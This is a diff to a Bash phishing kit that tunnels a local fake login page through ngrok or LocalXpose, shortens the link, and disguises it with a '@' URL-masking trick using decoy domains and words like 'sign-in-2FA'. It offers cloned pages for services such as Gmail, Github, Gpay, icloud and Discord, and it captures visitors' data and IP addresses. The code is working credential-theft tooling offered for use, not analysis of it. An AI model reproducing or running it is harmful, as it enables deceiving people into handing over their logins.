@@ -280,70 +280,65 @@ ngrok_token_check(){
 }
 ngrok_token_setup(){
         if [[ -d "${HOME}/.ngrok2/" ]]; then
-               echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok2 directory exists!!"
+		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok2 directory exists!!"
         else
-               mkdir $HOME/.ngrok2
-               echo -ne "\n${RED}[${WHITE}-${RED}]${RED} Created Ngrok2 directory "
+		mkdir $HOME/.ngrok2
+		echo -ne "\n${RED}[${WHITE}-${RED}]${RED} Created Ngrok2 directory "
 		echo " "
         fi
 
-        if [[ -s "${HOME}/.ngrok2/ngrok.yml" ]]; then
-					rm -rf ${HOME}/.ngrok2/ngrok.yml
-					read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter your authtoken :" ntoken
-					authline="authtoken : ${ntoken}"
-					echo "$authline" >> ngrok.yml
-					mv ngrok.yml ${HOME}/.ngrok2/
-        else
-					read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter your authtoken :" ntoken
-					echo "authtoken : ${ntoken}" >> ngrok.yml
-					mv ngrok.yml ${HOME}/.ngrok2/
-        fi
+	rm -rf ${HOME}/.ngrok2/ngrok.yml
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter your authtoken :" ntoken
+	echo "authtoken : ${ntoken}" >> ngrok.yml
+	mv ngrok.yml ${HOME}/.ngrok2/
 	./.server/ngrok config upgrade
 	echo -ne "\n${RED}[${WHITE}-${RED}]${RED} Upgraded ngrok configurations"
 	start_ngrok
 }
 ngrok_region() {
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter prefered region (Deafult=us):"
-				read -p "${GREEN} (Example: us eu au ap sa jp in ):" ngrokregion
-				case $ngrokregion in
-				"us" | "US")
-					ngrokregion="us";;
-				"eu" | "EU")
-					ngrokregion="eu";;
-				"au" | "AU")
-					ngrokregion="au";;
-				"ap" | "AP")
-					ngrokregion="ap";;
-				"sa" | "SA")
-					ngrokregion="sa";;
-				"jp" | "JP")
-					ngrokregion="jp";;
-				"in" | "IN")
-					ngrokregion="in";;
-				*)
-					echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Tryagain"
-					sleep 5
-					ngrok_region;;
-				esac
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter prefered region (Deafult=us) : "
+	read -p "${GREEN} (Example: us eu au ap sa jp in) : " ngrokregion
+	case $ngrokregion in
+	"us" | "US")
+		ngrokregion="us";;
+	"eu" | "EU")
+		ngrokregion="eu";;
+	"au" | "AU")
+		ngrokregion="au";;
+	"ap" | "AP")
+		ngrokregion="ap";;
+	"sa" | "SA")
+		ngrokregion="sa";;
+	"jp" | "JP")
+		ngrokregion="jp";;
+	"in" | "IN")
+		ngrokregion="in";;
+	*)
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Tryagain"
+		sleep 5
+		clear
+		banner
+		ngrok_region;;
+	esac
 }
 ## Start ngrok
 start_ngrok() {
         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
         { sleep 1; setup_site; }
-				echo -e "\n"
-				ngrokregion="us"
-        read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " reply
-				case $REPLY in
-				Y | y)
-					ngrok_region;;
-				N | n | *)
-					echo " ";;
-				esac
-        echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
+	echo -e "\n"
+	ngrokregion="us"
+        read -p "${RED}[${WHITE}-${RED}]${GREEN} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] : ${ORANGE} " reply
+	case $reply in
+	Y | y)
+		ngrok_region;;
+	N | n | *)
+		echo " ";;
+	esac
+        echo -ne "${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
     if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
+        sleep 2 && ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
     else
-        sleep 2 && ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
+        sleep 2 && ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT"> /dev/null 2>&1 &
     fi
 	sleep 15
 	fetchlink_ngrok
@@ -457,7 +452,7 @@ start_loclx() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
+	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] : ${ORANGE} " opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
@@ -559,41 +554,40 @@ cusurl(){
 	clear
 	banner
 	echo " "
-	echo -ne "${RED}[${WHITE}-${RED}]${ORANGE} Do You want to Customize the uRL BeLow?"
+	echo -ne "${RED}[${WHITE}-${RED}]${GREEN} Do You want to Customize the uRL BeLow?"
 	echo " "
-	read -p "${RED}[${WHITE}-${RED}]${ORANGE} $LINK (Y/n):${ORANGE}" CUS_URI
+	read -p "${RED}[${WHITE}-${RED}]${ORANGE} $LINK (Y/n) : ${ORANGE}" CUS_URI
 	case $CUS_URI in
                 Y | y)
-								check_netstats
-								if [ $netstats=="Online" ]; then
-									shorten_keystocks
-								else
-									echo "${RED}Your offline, Cannot shorten link. Proceeding without shortening link"
-									sleep 5
-									{ clear; sbanner; }
-									displaylink
-									capture_data_check
-								fi;;
-                N | n | *)
-                        { clear; sbanner; }
-												displaylink
-												capture_data_check;;
+			check_netstats
+			if [ $netstats=="Online" ]; then
+				shorten_keystocks
+			else
+				{ clear; sbanner; }
+				echo "${RED}Your offline, Cannot shorten link. Proceeding without shortening link"
+				sleep 5
+				displaylink
+				capture_data_check
+			fi;;
+                N | n )
+			displaylink
+			capture_data_check;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Try again!!!\a\a"
 	                { clear; banner; cusurl; }
                 esac
 }
 shorten_keystocks(){
-			read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN}Enter Your Custom uRL (eg:https://google.com | www.google.com):" CUS_URL
-							checkurl ${CUS_URL}
-							echo " "
-							read -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Some KeyStocks (${WHITE}eg: sign-in-2FA ${ORANGE})${GREEN} : ${ORANGE}" Keystks #KEY_STOCKS
-							if [[ ${Keystks} =~ ^([0-9a-zA-Z-]*)$ ]]; then
-											shorten
-							else
-											echo -ne "\n\a\a${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid Input : ${Keystks}"
-											{ sleep 1.5; clear; banner; cusurl; }
-							fi
+	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN}Enter Your Custom uRL (eg:https://google.com | www.google.com) : " CUS_URL
+	checkurl ${CUS_URL}
+	echo " "
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter Some KeyStocks (${WHITE}eg: sign-in-2FA ${ORANGE})${GREEN} : ${ORANGE}" Keystks #KEY_STOCKS
+	if [[ ${Keystks} =~ ^([0-9a-zA-Z-]*)$ ]]; then
+		shorten
+	else
+		echo -ne "\n\a\a${RED}[${WHITE}!${RED}]${RED} Error [105] : Invalid Input : ${Keystks}"
+		{ sleep 1.5; clear; banner; cusurl; }
+	fi
 }
 checkurl() { #3 checking for HTTP|S or WWW input type is valid or not.
 	if [[ ! "${1//:*}" =~ ^([h][t][t][p]|[h][t][t][p][s])$ ]]; then
@@ -605,16 +599,33 @@ checkurl() { #3 checking for HTTP|S or WWW input type is valid or not.
 }
 check_site() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
 shorten() {
+	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} SHORTENING URL : ${YELLOW} ${LINK}"
+	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Shortening maytake some time (approx 30 seconds)"
 	isgd="https://is.gd/create.php?format=simple&url="
 	shortcode="https://api.shrtco.de/v2/shorten?url="
 	tinyurl="https://tinyurl.com/api-create.php?url="
-		if [[ $(check_site $isgd) == 2* ]]; then
-			shorten_isgd $isgd "$LINK"
-		elif [[ $(check_site $shortcode) == 2* ]]; then
-			shorten_shortcode $shortcode "$LINK"
-		else
-			shorten_tinyurl $tinyurl "$LINK"
-		fi
+	if [[ $(check_site $isgd) == 2* ]]; then
+		shorten_isgd $isgd "$LINK"
+	else
+		final_isgd_url="${ORANGE} Couldn't shorten this link here"
+                masked_isgd_url="${ORANGE} Couldn't mask this link here"
+	fi
+	if [[ $(check_site $shortcode) == 2* ]]; then
+		shorten_shortcode $shortcode "$LINK"
+	else
+		final_shortcode_url1="${ORANGE} Couldn't shorten this link here"
+                masked_shortcode_url1="${ORANGE} Couldn't mask this link here"
+		final_shortcode_url2="${ORANGE} Couldn't shorten this link here"
+                masked_shortcode_url2="${ORANGE} Couldn't mask this link here"
+		final_shortcode_url3="${ORANGE} Couldn't shorten this link here"
+                masked_shortcode_url3="${ORANGE} Couldn't mask this link here"
+	fi
+	if [[ $(check_site $tinyurl) == 2* ]]; then
+		shorten_tinyurl $tinyurl "$LINK"
+	else
+		final_tinyurl_url="${ORANGE} Couldn't shorten this link here"
+                masked_tinyurl_url="${ORANGE} Couldn't mask this link here"
+	fi
 	displayshortlink
 }
 shorten_isgd() {
@@ -624,18 +635,18 @@ shorten_isgd() {
 	masked_isgd_url="${CUS_URL}-${Keystks}@$processed_isgd_url"
 }
 shorten_shortcode() {
-		link_shortcode1=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
-		processed_shortcode_url1=$(echo ${link_shortcode1} | sed 's/\\//g' | grep -o '"short_link":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
-		final_shortcode_url1="https://$processed_shortcode_url1"
-		masked_shortcode_url1="${CUS_URL}-${Keystks}@$processed_shortcode_url1"
-		link_shortcode2=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
-		processed_shortcode_url2=$(echo ${link_shortcode2} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
-		final_shortcode_url2="https://$processed_shortcode_url2"
-		masked_shortcode_url2="${CUS_URL}-${Keystks}@$processed_shortcode_url2"
-		link_shortcode3=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
-		processed_shortcode_url3=$(echo ${link_shortcode3} | sed 's/\\//g' | grep -o '"short_link3":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
-		final_shortcode_url3="https://$processed_shortcode_url3"
-		masked_shortcode_url3="${CUS_URL}-${Keystks}@$processed_shortcode_url3"
+	link_shortcode1=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+	processed_shortcode_url1=$(echo ${link_shortcode1} | sed 's/\\//g' | grep -o '"short_link":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+	final_shortcode_url1="https://$processed_shortcode_url1"
+	masked_shortcode_url1="${CUS_URL}-${Keystks}@$processed_shortcode_url1"
+	link_shortcode2=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+	processed_shortcode_url2=$(echo ${link_shortcode2} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+	final_shortcode_url2="https://$processed_shortcode_url2"
+	masked_shortcode_url2="${CUS_URL}-${Keystks}@$processed_shortcode_url2"
+	link_shortcode3=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+	processed_shortcode_url3=$(echo ${link_shortcode3} | sed 's/\\//g' | grep -o '"short_link3":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+	final_shortcode_url3="https://$processed_shortcode_url3"
+	masked_shortcode_url3="${CUS_URL}-${Keystks}@$processed_shortcode_url3"
 }
 shorten_tinyurl() {
 	link_tinyurl=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
@@ -649,22 +660,22 @@ displaylink(){
 	clear
 	sbanner
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} LOCALHOST URL : ${GREEN}${HOST}:${PORT}"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} ORIGINAL URL : ${GREEN}${LINK}"
-	echo -e "\n"
 }
 displayshortlink() {
 	displaylink
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} ORIGINAL URL  : ${GREEN}${LINK}"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 1 : ${GREEN}${final_isgd_url}"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  1 : ${GREEN}${masked_isgd_url}"
+	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  1 : ${GREEN}${masked_isgd_url}"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 2 : ${GREEN}${final_shortcode_url1}"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  2 : ${GREEN}${masked_shortcode_url1}"
+	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  2 : ${GREEN}${masked_shortcode_url1}"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 3 : ${GREEN}${final_shortcode_url2}"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  3 : ${GREEN}${masked_shortcode_url2}"
+	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  3 : ${GREEN}${masked_shortcode_url2}"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 4 : ${GREEN}${final_shortcode_url3}"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  4 : ${GREEN}${masked_shortcode_url3}"
+	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  4 : ${GREEN}${masked_shortcode_url3}"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} SHORTEN URL 5 : ${GREEN}${final_tinyurl_url}"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  5 : ${GREEN}${masked_tinyurl_url}"
+	echo -e "${RED}[${WHITE}-${RED}]${BLUE} MASKED URL  5 : ${GREEN}${masked_tinyurl_url}"
 	echo -e "\n${RED}[${WHITE}#${RED}]${BLUE}If above link is empty just ignore it, Use the generated link"
+	capture_data_check
 }
 ## Get IP address
 capture_ip() {
@@ -985,7 +996,7 @@ echo -e "${BLUE} [14] ${GREEN} Flipcart 	 ${NC}""${BLUE} [39] ${GREEN} ProtonMai
 echo -e "${BLUE} [15] ${GREEN} Freefire 	 ${NC}""${BLUE} [40] ${GREEN} Pubg              ${NC}""${BLUE} [65] ${GREEN} Discord           ${NC}"
 echo -e "${BLUE} [16] ${GREEN} Github 		 ${NC}""${BLUE} [41] ${GREEN} Quora             ${NC}""${BLUE} [66] ${GREEN} Jio router        ${NC}"
 echo -e "${BLUE} [17] ${GREEN} Gitlab 		 ${NC}""${BLUE} [42] ${GREEN} Reddit            ${NC}""${BLUE} [67] ${GREEN} Google WIFI       ${NC}"
-echo -e "${BLUE} [18] ${GREEN} Gmail		 ${NC}""${BLUE} [43] ${GREEN} Shopify           ${NC}""${BLUE} [68] ${ORANGE} Mobile Pattern    ${NC}"
+echo -e "${BLUE} [18] ${GREEN} Gmail		 ${NC}""${BLUE} [43] ${GREEN} Shopify           ${NC}""${BLUE} [68] ${GREEN} Mobile Pattern    ${NC}"
 echo -e "${BLUE} [19] ${GREEN} Google 		 ${NC}""${BLUE} [44] ${GREEN} Snapchat          ${NC}"
 echo -e "${BLUE} [20] ${GREEN} Gpay 	   	 ${NC}""${BLUE} [45] ${GREEN} Socialclub        ${NC}"
 echo -e "${BLUE} [21] ${GREEN} icloud 		 ${NC}""${BLUE} [46] ${GREEN} Spotify           ${NC}"
